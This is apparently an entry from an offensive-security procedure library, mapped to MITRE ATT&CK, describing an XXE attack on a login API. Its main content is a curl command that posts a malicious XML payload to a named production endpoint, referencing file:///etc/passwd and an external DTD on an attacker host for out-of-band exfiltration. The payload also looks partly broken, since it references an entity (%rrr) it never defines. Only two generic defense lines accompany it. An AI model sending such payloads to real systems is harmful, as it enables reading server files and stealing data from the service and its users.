---
tags:
  - xxe
  - payload
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/send-xxe-payload]]'
platforms:
  - Web
  - Linux
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: ebf921e9-85a0-4c9b-affc-71e3fcd19584
created_at: '2025-12-13T09:00:27.903Z'
updated_at: '2025-12-13T09:00:27.903Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Send Malicious XML Payload to Login Endpoint

## Summary

This procedure crafts and sends a malicious XML payload to exploit an XXE vulnerability in the login API, referencing external entities to include local files and external DTDs for exfiltration.

## Description

The payload is sent via POST to the vulnerable endpoint, triggering the XML parser to process external entities, load the DTD, and initiate out-of-band requests containing sensitive data from the Linux server.

## Requirements

1. Access to the target API endpoint
2. Pre-hosted external DTD on attacker's server
3. Tool for sending HTTP requests (e.g., curl)

## Defense

Defensive measures and detection strategies:

- Validate and sanitize XML inputs
- Log and alert on anomalous XML parsing errors or external requests

## Objectives

1. Trigger XXE processing
2. Include sensitive file contents via entities
3. Initiate exfiltration through external DTD

## Instructions

### Step 1: Craft and Send Payload

**Context**: Construct the XML with DOCTYPE entities and send via POST.

**Command** ([[commands/send-xxe-payload]]):

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % b PUBLIC "lol" "file:///etc/passwd"> <!ENTITY % asd PUBLIC "lol" "http://mysite/xx.html"> %asd; %rrr; ]><login><login></login></login>' https://app.informaticaondemand.com/ma/api/v2/user/login
```

> This payload defines entities for file inclusion and external DTD loading.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/send-xxe-payload]]

## Tools Used



## Tags

- [[xxe]]
- [[payload]]
